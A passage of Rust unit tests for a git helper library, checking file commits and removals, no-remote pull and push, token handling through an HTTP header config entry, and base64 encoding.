    fn commits_a_removal() {
        let (_dir, root) = opened();

        git_commit_file(
            root.clone(),
            "a.json".into(),
            b"{}".to_vec(),
            "Update a.json".into(),
            settings(),
        )
        .expect("committed");

        let removed =
            git_commit_removal(root.clone(), "a.json".into(), "Remove a.json".into(), settings())
                .expect("removed");

        assert!(removed);
        assert_eq!(git_read(root.clone(), "a.json".into()).expect("read"), None);
        assert!(git_tree(root, settings()).expect("listed").is_empty());
    }

    #[test]
    fn says_nothing_was_removed_when_the_path_was_never_tracked() {
        let (_dir, root) = opened();

        let removed =
            git_commit_removal(root, "nothing.json".into(), "Remove".into(), settings())
                .expect("asked");

        assert!(!removed);
    }

    #[test]
    fn commits_nothing_when_the_bytes_are_already_there() {
        let (_dir, root) = opened();

        for _ in 0..2 {
            git_commit_file(
                root.clone(),
                "a.json".into(),
                b"{}".to_vec(),
                "Update a.json".into(),
                settings(),
            )
            .expect("committed");
        }

        let log = run(
            &canonical_root(&root).expect("a root"),
            &settings(),
            &["log", "--oneline"],
        )
        .expect("a log");

        assert_eq!(log.lines().count(), 1);
    }

    #[test]
    fn a_repository_with_no_remote_is_ready() {
        let (_dir, root) = opened();

        assert!(git_ready(root, settings()).expect("asked").ok);
    }

    #[test]
    fn pulling_and_pushing_without_a_remote_do_nothing() {
        let (_dir, root) = opened();

        assert!(git_pull(root.clone(), settings()).is_ok());
        assert!(git_push(root, settings()).is_ok());
    }

    #[test]
    fn keeps_the_token_out_of_the_arguments() {
        let mut with_token = settings();
        with_token.token = "ghp_secret".to_string();

        let entries = config(&with_token);
        let header = entries
            .iter()
            .find(|(key, _)| key == "http.extraHeader")
            .expect("an authorization header");

        assert_eq!(header.1, format!("Authorization: Basic {}", base64(b"x-access-token:ghp_secret")));
    }

    #[test]
    fn encodes_base64_the_way_everyone_else_does() {
        assert_eq!(base64(b""), "");
        assert_eq!(base64(b"f"), "Zg==");
        assert_eq!(base64(b"fo"), "Zm8=");
        assert_eq!(base64(b"foo"), "Zm9v");
        assert_eq!(base64(b"foob"), "Zm9vYg==");
        assert_eq!(base64(b"user:token"), "dXNlcjp0b2tlbg==");
    }
}
